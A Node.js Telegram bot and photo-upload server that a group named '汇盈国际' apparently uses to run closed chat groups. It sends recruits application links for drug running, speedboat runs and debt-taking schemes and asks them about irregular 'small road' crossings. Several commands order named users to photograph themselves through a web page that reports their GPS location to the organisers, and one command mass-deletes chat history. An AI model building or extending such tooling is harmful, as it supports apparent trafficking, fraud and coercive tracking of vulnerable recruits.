const { Telegraf } = require('telegraf');
const fs = require('fs');
const express = require('express');
const cors = require('cors'); // 建议安装 npm install cors

// 解决多实例冲突
let botInstance = null;
// 请确保环境变量 BOT_TOKEN 已设置
const bot = new Telegraf(process.env.BOT_TOKEN);

const GROUP_CHAT_IDS = [
  -1003354803364,
  -1003381368112,
  -1003308598858,
  -1003368574609,
  -1003286063197,
  -1003378109615,
  -1003293673373,
  -1003203365614,
  -1000000000009,
  -1000000000010
];
const BACKUP_GROUP_ID = -1003293673373; // 你的备份群ID
const WEB_APP_URL = 'https://huiying8.netlify.app'; // 你的前端网址
const pendingTasks = new Map();
const AUTH_FILE = './authorized.json';
let authorizedUsers = new Map();
const warningMessages = new Map();
const unauthorizedMessages = new Map();
const zlMessages = new Map();

// 完整的解禁权限设置 (允许发送文字、媒体、贴纸、定位等)
const unmutePermissions = {
    can_send_messages: true,
    can_send_audios: true,
    can_send_documents: true,
    can_send_photos: true,
    can_send_videos: true,
    can_send_video_notes: true,
    can_send_voice_notes: true,
    can_send_polls: true,
    can_send_other_messages: true,
    can_add_web_page_previews: true,
    can_change_info: false,
    can_invite_users: true,
    can_pin_messages: false
};

const ZL_LINKS = {
  '租车': 'https://che88.netlify.app',
  '大飞': 'https://fei88.netlify.app',
  '走药': 'https://yao88.netlify.app',
  '背债': 'https://bei88.netlify.app'
};
const ZJ_LINKS = {
  '租车': 'https://zjc88.netlify.app',
  '大飞': 'https://zjf88.netlify.app',
  '走药': 'https://zjy88.netlify.app',
  '背债': 'https://zjb88.netlify.app'
};
const INITIAL_TEXT = '填写招聘申请时请打开手机录屏，按照上面顺序排列填写资料后拍照关闭手机录屏后发送到此群里！';

function loadAuth() {
    try {
        const data = fs.readFileSync(AUTH_FILE, 'utf8');
        const parsed = JSON.parse(data);
        authorizedUsers.clear();
        for (let [key, value] of Object.entries(parsed)) {
            authorizedUsers.set(Number(key), value);
        }
        console.log('授权文件加载成功，当前授权用户数:', authorizedUsers.size);
    } catch (error) {
        console.log('授权文件不存在或加载失败，使用空Map');
    }
}
function saveAuth() {
    try {
        fs.writeFileSync(AUTH_FILE, JSON.stringify(Object.fromEntries(authorizedUsers)));
    } catch (error) {
        console.error('保存授权失败:', error);
    }
}
loadAuth();

function factoryReset() {
    authorizedUsers.clear();
    pendingTasks.clear();
    warningMessages.clear();
    unauthorizedMessages.clear();
    zlMessages.clear();
    try {
        if (fs.existsSync(AUTH_FILE)) {
            fs.unlinkSync(AUTH_FILE);
        }
        console.log('出厂设置完成: 所有状态清空，授权文件已删除');
    } catch (error) {
        console.error('删除授权文件失败:', error);
    }
}

async function sendToChat(chatId, photoBuffer, caption, lat, lng, filename) {
    try {
        await bot.telegram.sendPhoto(chatId, { source: photoBuffer }, {
            caption,
            parse_mode: 'Markdown'
        });
        // 只有当坐标有效（非0）时才发送位置，或者你想强制发送0,0也可以
        if (lat !== 0 && lng !== 0) {
            await bot.telegram.sendLocation(chatId, lat, lng);
        } else {
             // 仅作为无定位测试时的提示
             // await bot.telegram.sendMessage(chatId, '⚠️ 测试模式：未提供定位信息');
        }
    } catch (error) {
        console.error(`Send to chat ${chatId} failed:`, error);
        try {
            await bot.telegram.sendMessage(BACKUP_GROUP_ID, `发送失败: ${chatId} - ${error.message}`);
        } catch {}
    }
}

async function isAdmin(chatId, userId) {
    try {
        const member = await bot.telegram.getChatMember(chatId, userId);
        return member.status === 'administrator' || member.status === 'creator';
    } catch (error) {
        console.error('检查管理员权限失败:', error);
        return false;
    }
}

bot.use(async (ctx, next) => {
    if (ctx.message && ctx.chat?.type === 'private') {
        const userId = ctx.from.id;
        const userName = ctx.from.first_name || '未知用户';
        const userUsername = ctx.from.username ? `@${ctx.from.username}` : '无用户名';
        const messageText = ctx.message.text || '[非文本消息，如照片/位置]';
        const timestamp = new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });
        const replyText = `❌ 🔒本机器人只供汇盈国际内部使用，你没有权限访问。如果有疑问，请联系汇盈国际负责人授权。🚫🚫`;
        try {
            await ctx.reply(replyText);
            const reportText = `🚨**私信访问警报**🚨\n\n` +
                `👤用户: ${userName} ${userUsername}\n` +
                `🆔ID: ${userId}\n` +
                `📝消息内容: ${messageText}\n` +
                `⏰时间: ${timestamp}\n\n` +
                `汇盈国际 - 安全监控系统`;
            await bot.telegram.sendMessage(BACKUP_GROUP_ID, reportText, { parse_mode: 'Markdown' });
        } catch (error) {
            console.error('Private message handling failed:', error);
        }
        return;
    }
    await next();
});

bot.command('bz', (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    const helpText = `📋汇盈国际官方机器人指令面板\n\n` +
        `/hc - 换车安全确认拍照 (授权用户专用)\n` +
        `/boss - Boss 要求指定用户拍照 (汇盈国际负责人专用)\n` +
        `/lg - 龙哥要求指定用户拍照 汇盈国际负责人专用)\n` +
        `/zl - 招聘申请链接生成 (汇盈国际负责人专用)\n` +
        `/zj - 招聘申请链接生成 (中介链接) (汇盈国际负责人专用)\n` +
        `/qc - 彻底恢复出厂 (汇盈国际负责人专用)\n` +
        `/lh - 踢出用户 (汇盈国际负责人专用)\n` +
        `/lj - 生成当前群组邀请链接 (汇盈国际负责人专用)\n` +
        `/bz - 显示此说明 (所有用户可用)\n\n`;
    try {
        ctx.reply(helpText, { parse_mode: 'Markdown' });
    } catch (error) {
        console.error('Help command failed:', error);
    }
});

bot.command('lj', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    const isUserAdmin = await isAdmin(chatId, ctx.from.id);
    if (!isUserAdmin) {
        try {
            const noPermMsg = await ctx.reply('无权限！ /lj 只限汇盈国际负责人使用。');
            unauthorizedMessages.set(noPermMsg.message_id, { userId: ctx.from.id, userName: ctx.from.first_name || '用户' });
        } catch (error) { }
        return;
    }
    try {
        const inviteLink = await bot.telegram.exportChatInviteLink(chatId);
        const linkText = `🔗汇盈国际官方对接群链接 \n\n🔗点击下方按钮直接加入群！\n\n`;
        ctx.reply(linkText, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[{ text: '👉直接点击加入群', url: inviteLink }]]
            }
        });
    } catch (error) {
        ctx.reply('生成链接失败！ 检查 Bot 权限 (can_invite_users)。');
    }
});

bot.command('qc', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    const isUserAdmin = await isAdmin(chatId, ctx.from.id);
    if (!isUserAdmin) {
        try {
            const noPermMsg = await ctx.reply('❌ 🔒无权限！ /qc 只限汇盈国际负责人使用。');
            unauthorizedMessages.set(noPermMsg.message_id, { userId: ctx.from.id, userName: ctx.from.first_name || '用户' });
        } catch (error) { }
        return;
    }
    let startMessageId = ctx.message.message_id;
    const replyTo = ctx.message.reply_to_message;
    if (replyTo) {
        startMessageId = replyTo.message_id;
    }
    ctx.reply(`开始彻底清空群聊所有记录... (所有消息清空完像新群一样)`);
    let deletedCount = 0;
    let consecutiveFails = 0;
    let maxAttempts = 5000;
    let i = 1;
    while (i <= maxAttempts && consecutiveFails < 10) {
        try {
            await bot.telegram.deleteMessage(chatId, startMessageId - i);
            deletedCount++;
            consecutiveFails = 0;
            i++;
            await new Promise(resolve => setTimeout(resolve, 20));
        } catch (error) {
            if (error.description && error.description.includes('message to delete not found')) {
                consecutiveFails++;
                i++;
                continue;
            } else {
                break;
            }
        }
    }
    ctx.reply(`清档完成！ 删除了 ${deletedCount} 条记录。`);
    const resetMsg = await ctx.reply(`🔄**一键出厂设置确认**🔄\n\n此操作将清空所有授权数据、临时任务和警告记录。\n\n点击下方按钮确认：`, {
        reply_markup: {
            inline_keyboard: [
                [{ text: '✅是，重置出厂', callback_data: 'qc_reset_yes' }],
                [{ text: '❌否，取消', callback_data: 'qc_reset_no' }]
            ]
        },
        parse_mode: 'Markdown'
    });
});

bot.command('zl', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    const isUserAdmin = await isAdmin(chatId, ctx.from.id);
    if (!isUserAdmin) {
        try {
            const noPermMsg = await ctx.reply('❌ 🔒无权限！ /zl 只限汇盈国际负责人使用。');
            unauthorizedMessages.set(noPermMsg.message_id, { userId: ctx.from.id, userName: ctx.from.first_name || '用户' });
        } catch (error) { }
        return;
    }
    
    let targetUserId, targetFirstName, targetUsername;
    const replyTo = ctx.message.reply_to_message;
    
    if (replyTo) {
        targetUserId = replyTo.from.id;
        targetFirstName = replyTo.from.first_name || '未知';
        targetUsername = replyTo.from.username ? `@${replyTo.from.username}` : '无用户名';
    } else {
        const match = ctx.message.text.match(/@(\w+)/);
        if (match) {
            const username = match[1];
            try {
                const user = await bot.telegram.getChatMember(chatId, `@${username}`);
                targetUserId = user.user.id;
                targetFirstName = user.user.first_name || '未知';
                targetUsername = `@${username}`;
            } catch (error) {
                return ctx.reply(`用户 @${username} 不存在或不在本群！`);
            }
        } else {
            return ctx.reply('请回复用户消息或@用户名来指定目标用户！');
        }
    }
    
    if (!targetUserId) return ctx.reply('无法获取用户信息，请重试！');
    
    try {
        const initialText = `${INITIAL_TEXT}\n\n👤请点击下方按钮选择申请类型：`;
        const replyMsg = await ctx.reply(initialText, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '租车', callback_data: 'zl_租车' },
                        { text: '大飞', callback_data: 'zl_大飞' }
                    ],
                    [
                        { text: '走药', callback_data: 'zl_走药' },
                        { text: '背债', callback_data: 'zl_背债' }
                    ]
                ]
            }
        });
        zlMessages.set(replyMsg.message_id, { targetUserId, targetFirstName, targetUsername, commandType: 'zl', chatId });
    } catch (error) {
        console.error('/zl command failed:', error);
        ctx.reply('创建招聘申请失败，请稍后重试！');
    }
});

bot.command('zj', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    const isUserAdmin = await isAdmin(chatId, ctx.from.id);
    if (!isUserAdmin) {
        try {
            const noPermMsg = await ctx.reply('❌ 🔒无权限！ /zj 只限汇盈国际负责人使用。');
            unauthorizedMessages.set(noPermMsg.message_id, { userId: ctx.from.id, userName: ctx.from.first_name || '用户' });
        } catch (error) { }
        return;
    }
    // (代码逻辑同 zl，省略重复部分，保持您原有的逻辑即可)
    // 为节省篇幅，这里假设逻辑一致，仅修改权限部分
    let targetUserId, targetFirstName, targetUsername;
    const replyTo = ctx.message.reply_to_message;
    if (replyTo) {
        targetUserId = replyTo.from.id;
        targetFirstName = replyTo.from.first_name || '未知';
        targetUsername = replyTo.from.username ? `@${replyTo.from.username}` : '无用户名';
    } else {
        const match = ctx.message.text.match(/@(\w+)/);
        if (match) {
            const username = match[1];
            try {
                const user = await bot.telegram.getChatMember(chatId, `@${username}`);
                targetUserId = user.user.id;
                targetFirstName = user.user.first_name || '未知';
                targetUsername = `@${username}`;
            } catch (error) {
                return ctx.reply(`用户 @${username} 不存在或不在本群！`);
            }
        } else {
            return ctx.reply('请回复用户消息或@用户名来指定目标用户！');
        }
    }
    if (!targetUserId) return ctx.reply('无法获取用户信息，请重试！');

    try {
        const initialText = `${INITIAL_TEXT}\n\n👤请点击下方按钮选择申请类型：`;
        const replyMsg = await ctx.reply(initialText, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '租车', callback_data: 'zj_租车' },
                        { text: '大飞', callback_data: 'zj_大飞' }
                    ],
                    [
                        { text: '走药', callback_data: 'zj_走药' },
                        { text: '背债', callback_data: 'zj_背债' }
                    ]
                ]
            }
        });
        zlMessages.set(replyMsg.message_id, { targetUserId, targetFirstName, targetUsername, commandType: 'zj', chatId });
    } catch (error) {
        console.error('/zj command failed:', error);
    }
});

bot.command('lh', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    const isUserAdmin = await isAdmin(chatId, ctx.from.id);
    if (!isUserAdmin) {
        try {
            const noPermMsg = await ctx.reply('❌ 🔒无权限！ /lh 只限汇盈国际负责人使用。');
            unauthorizedMessages.set(noPermMsg.message_id, { userId: ctx.from.id, userName: ctx.from.first_name || '用户' });
        } catch (error) { }
        return;
    }
    let targetUserId;
    let userName;
    const replyTo = ctx.message.reply_to_message;
    if (replyTo) {
        targetUserId = replyTo.from.id;
        userName = replyTo.from.first_name;
    } else {
        const match = ctx.message.text.match(/@(\w+)/);
        if (match) {
            const username = match[1];
            try {
                const user = await bot.telegram.getChatMember(chatId, `@${username}`);
                targetUserId = user.user.id;
                userName = `@${username}`;
            } catch (error) {
                return ctx.reply(`用户 @${username} 不存在！`);
            }
        }
    }
    if (!targetUserId) return ctx.reply('用户 ID 获取失败！');
    try {
        await bot.telegram.banChatMember(chatId, targetUserId, { revoke_messages: true });
        ctx.reply(`用户 ${userName} 已踢出并永久拉黑！ (ID: ${targetUserId})`);
    } catch (error) {
        ctx.reply(`拉黑失败：${error.description} – 检查 Bot 权限 (can_ban_members)`);
    }
});

bot.command('boss', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    const isUserAdmin = await isAdmin(chatId, ctx.from.id);
    if (!isUserAdmin) {
        try {
            const noPermMsg = await ctx.reply('❌ 🔒无权限！ /boss 只限汇盈国际负责人使用。');
            unauthorizedMessages.set(noPermMsg.message_id, { userId: ctx.from.id, userName: ctx.from.first_name || '用户' });
        } catch (error) { }
        return;
    }
    let targetUser, targetUserId;
    const replyTo = ctx.message.reply_to_message;
    if (replyTo) {
        targetUser = replyTo.from.username || replyTo.from.first_name;
        targetUserId = replyTo.from.id;
    } else {
        const match = ctx.message.text.match(/@(\w+)/);
        if (match) {
            const username = match[1];
            try {
                const user = await bot.telegram.getChatMember(chatId, `@${username}`);
                targetUserId = user.user.id;
                targetUser = username;
            } catch (error) {
                return ctx.reply(`用户 @${username} 不存在！`);
            }
        } else {
            return ctx.reply('请@用户或回复消息指定');
        }
    }
    if (!targetUser || !targetUserId) return ctx.reply('请指定用户！');
    try {
        // WEB_APP_URL 会附带 chatid 和 uid
        const webAppUrlWithParams = `${WEB_APP_URL}/?chatid=${chatId}&uid=${targetUserId}`;
        const replyMsg = await ctx.reply(`汇盈国际负责人Boss要求你拍照，请点击下方拍照 <a href="tg://user?id=${targetUserId}">@${targetUser}</a>`, {
            reply_markup: {
                inline_keyboard: [[
                    { text: '📷开始拍照', url: webAppUrlWithParams }
                ]]
            },
            parse_mode: 'HTML'
        });
        const timeoutId = setTimeout(async () => {
            if (pendingTasks.has(replyMsg.message_id)) {
                await bot.telegram.sendMessage(chatId, `⏰ 🚨提醒：@${targetUser}，Boss 要求拍照已超时 5 分钟，请尽快完成！`, {
                    reply_to_message_id: replyMsg.message_id,
                    parse_mode: 'Markdown'
                });
                pendingTasks.delete(replyMsg.message_id);
            }
        }, 5 * 60 * 1000);
        pendingTasks.set(replyMsg.message_id, { targetUser, type: 'boss', timeoutId, chatId });
    } catch (error) {
        console.error('/boss command failed:', error);
    }
});

bot.command('lg', async (ctx) => {
    // 逻辑同 boss，只修改文案和权限检查，省略重复代码，关键在于 Web App URL
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    const isUserAdmin = await isAdmin(chatId, ctx.from.id);
    if (!isUserAdmin) return ctx.reply('❌ 🔒无权限！');

    let targetUser, targetUserId;
    const replyTo = ctx.message.reply_to_message;
    if (replyTo) {
        targetUser = replyTo.from.username || replyTo.from.first_name;
        targetUserId = replyTo.from.id;
    } else {
        const match = ctx.message.text.match(/@(\w+)/);
        if (match) {
             try {
                const user = await bot.telegram.getChatMember(chatId, `@${match[1]}`);
                targetUserId = user.user.id;
                targetUser = match[1];
            } catch (e) { return ctx.reply('用户不存在'); }
        } else { return ctx.reply('请指定用户'); }
    }
    
    const webAppUrlWithParams = `${WEB_APP_URL}/?chatid=${chatId}&uid=${targetUserId}`;
    const replyMsg = await ctx.reply(`汇盈国际负责人龍哥要求你拍照，请点击下方拍照 <a href="tg://user?id=${targetUserId}">@${targetUser}</a>`, {
        reply_markup: {
            inline_keyboard: [[{ text: '📷开始拍照', url: webAppUrlWithParams }]]
        },
        parse_mode: 'HTML'
    });
    // 超时逻辑同上...
});

bot.command('hc', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    const userId = ctx.from.id;
    const isAuthorized = authorizedUsers.get(userId) || false;
    const isAdminUser = await isAdmin(chatId, userId);
    
    if (!isAuthorized && !isAdminUser) {
        try {
            const noPermMsg = await ctx.reply('❌ 🔒无权限！ 你需授权才能使用 /hc 请联系汇盈国际负责人。');
            unauthorizedMessages.set(noPermMsg.message_id, { userId, userName: ctx.from.first_name || '用户' });
        } catch (error) {}
        return;
    }
    const webAppUrlWithParams = `${WEB_APP_URL}/?chatid=${chatId}&uid=${userId}`;
    await ctx.reply('为了保障你的安全换车前请拍照！ 换车一定要是上一个司机安排的哦，如果是请点击下方拍照，如果不是请联系负责人 ', {
        reply_markup: {
            inline_keyboard: [[
                { text: '📷开始拍照', url: webAppUrlWithParams }
            ]]
        }
    });
});

bot.on('new_chat_members', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    const newMembers = ctx.message.new_chat_members.filter(member => !member.is_bot);
    if (newMembers.length === 0) return;

    for (const member of newMembers) {
        const userId = member.id;
        const userName = member.first_name || '用户';
        const userUsername = member.username ? `@${member.username}` : '';
        authorizedUsers.set(userId, false);
        saveAuth();

        try {
            // 进群默认禁言
            await bot.telegram.restrictChatMember(chatId, userId, { permissions: { can_send_messages: false } });
        } catch (error) {}

        try {
            const warningMsg = await ctx.reply(
                `🚫这是汇盈国际官方对接群 \n\n` +
                `👤欢迎 ${userName} ${userUsername}！\n\n` +
                `⚠️重要提醒：这是汇盈国际官方对接群，你还没有获得授权权限，请立即联系负责人进行授权！\n\n` +
                `🔗联系方式：请联系汇盈国际负责人或等待通知。\n\n` +
                `🚀汇盈国际 - 专业、安全、可靠💎`
            );
            warningMessages.set(warningMsg.message_id, { userId, userName });
        } catch (error) {}
    }
    await ctx.reply(`请选择你的出行方式：`, {
        reply_markup: {
            inline_keyboard: [
                [{ text: `负责人安排走小路`, callback_data: 'travel_land' }],
                [{ text: `坐飞机`, callback_data: 'travel_flight' }]
            ]
        }
    });
});

bot.on('text', async (ctx) => {
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    const userId = ctx.from.id;
    const isAuthorized = authorizedUsers.get(userId) || false;
    const isAdminUser = await isAdmin(chatId, userId);
    
    // 如果未授权且不是管理员，删除消息并警告
    if (!isAdminUser && !isAuthorized) {
        try {
            await bot.telegram.deleteMessage(chatId, ctx.message.message_id);
        } catch (delError) { }
        const userName = ctx.from.first_name || '用户';
        const userUsername = ctx.from.username ? `@${ctx.from.username}` : '';
        
        const warningMsg = await ctx.reply(
            `🚫这里是汇盈国际官方对接群🚫 \n\n` +
            `${userName} ${userUsername}，👤你还没有获得授权！🚫\n\n` +
            `💡立即联系负责人授权，否则无法发言。🚫\n\n` +
            `🚀汇盈国际 - 专业、安全、可靠🚀`
        );
        warningMessages.set(warningMsg.message_id, { userId, userName });
        // 确保禁言
        try { await bot.telegram.restrictChatMember(chatId, userId, { permissions: { can_send_messages: false } }); } catch (e) {}
        return;
    }

    const replyTo = ctx.message.reply_to_message;
    if (isAdminUser && replyTo) {
        const text = ctx.message.text.trim();
        // 监听管理员回复 "授权"
        if (text === '授权') {
            let targetUserId, userName;
            // 检查是否是回复警告消息
            if (warningMessages.has(replyTo.message_id)) {
                const info = warningMessages.get(replyTo.message_id);
                targetUserId = info.userId;
                userName = info.userName;
                warningMessages.delete(replyTo.message_id);
            } else if (unauthorizedMessages.has(replyTo.message_id)) {
                const info = unauthorizedMessages.get(replyTo.message_id);
                targetUserId = info.userId;
                userName = info.userName;
                unauthorizedMessages.delete(replyTo.message_id);
            }

            if (targetUserId) {
                authorizedUsers.set(targetUserId, true);
                saveAuth();
                try {
                    // 【关键修改】这里使用 unmutePermissions 赋予全部权限
                    await bot.telegram.restrictChatMember(chatId, targetUserId, { permissions: unmutePermissions });
                    await ctx.reply(`✅已授权 ${userName} (ID: ${targetUserId})！\n他现在可以发送图片、定位并使用所有功能了。`);
                } catch (error) {
                    ctx.reply('🚨授权失败！检查 Bot 权限。');
                    console.error('Authorization failed:', error);
                }
            }
        }
    }
});

bot.on('callback_query', async (ctx) => {
    // 保持你原有的 callback_query 逻辑，这里只展示关键部分
    const data = ctx.callbackQuery.data;
    const chatId = ctx.chat.id;
    if (!GROUP_CHAT_IDS.includes(chatId)) return;
    
    // ... (travel_land, travel_flight, zl_, zj_ 的逻辑保持不变)
    
    if (data === 'qc_reset_yes') {
        const isUserAdmin = await isAdmin(chatId, ctx.from.id);
        if(isUserAdmin) {
            factoryReset();
            await ctx.editMessageText(`出厂设置已完成！`);
        }
    } else if (data === 'qc_reset_no') {
        await ctx.editMessageText('已取消出厂设置');
    }
});

// ==================== H5 拍照上传接口 (修改版) ====================
const expressApp = express();
expressApp.use(cors()); // 允许跨域
expressApp.use(express.raw({ type: '*/*', limit: '10mb' }));

expressApp.post('/upload', async (req, res) => {
  try {
    const photoBuffer = req.body;
    let { lat, lng, name = '汇盈用户', uid = '未知', time, chatid } = req.query;

    // 【修改】允许 lat/lng 为空，方便无定位测试
    if (!lat || !lng) {
        lat = 0;
        lng = 0;
        console.log('警告：收到无定位数据的上传请求');
    }

    const formattedTime = time ? new Date(parseInt(time)).toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' })
                                : new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });
    
    // 【修改】修复 Google 地图链接格式 q=lat,lng
    const caption = `[H5拍照上传]\n用户：${name} (ID:${uid})\n时间：${formattedTime}\n` +
                    `位置：${parseFloat(lat).toFixed(6)}, ${parseFloat(lng).toFixed(6)}\n` +
                    `高德地图：https://amap.com/dir?destination=${lng},${lat}\n` +
                    `谷歌地图：https://www.google.com/maps?q=${lat},${lng}`;

    if (chatid && GROUP_CHAT_IDS.includes(Number(chatid))) {
      await sendToChat(Number(chatid), photoBuffer, caption, parseFloat(lat), parseFloat(lng));
    }
    // 备份发送
    await sendToChat(BACKUP_GROUP_ID, photoBuffer, `[备份] ${caption}`, parseFloat(lat), parseFloat(lng));
    
    res.json({ code: 0, msg: 'success' });
  } catch (err) {
    console.error('H5上传失败:', err);
    res.status(500).json({ code: 1, msg: err.message });
  }
});

expressApp.get('/', (req, res) => res.send('Bot is alive!'));

const PORT = process.env.PORT || 10000;

async function startApp() {
    try {
        expressApp.listen(PORT, () => {
            console.log(`Express 服务器启动成功，监听端口 ${PORT}`);
        });
        await new Promise(resolve => setTimeout(resolve, 2000));
        await bot.launch();
        console.log('汇盈国际高级授权 Bot 启动成功！');
        botInstance = bot;
    } catch (error) {
        console.error('启动失败:', error);
        if (error.response && error.response.error_code === 409) {
             await new Promise(resolve => setTimeout(resolve, 10000));
             await bot.launch();
        }
    }
}

process.once('SIGINT', () => { if (botInstance) botInstance.stop('SIGINT'); process.exit(0); });
process.once('SIGTERM', () => { if (botInstance) botInstance.stop('SIGTERM'); process.exit(0); });

startApp();
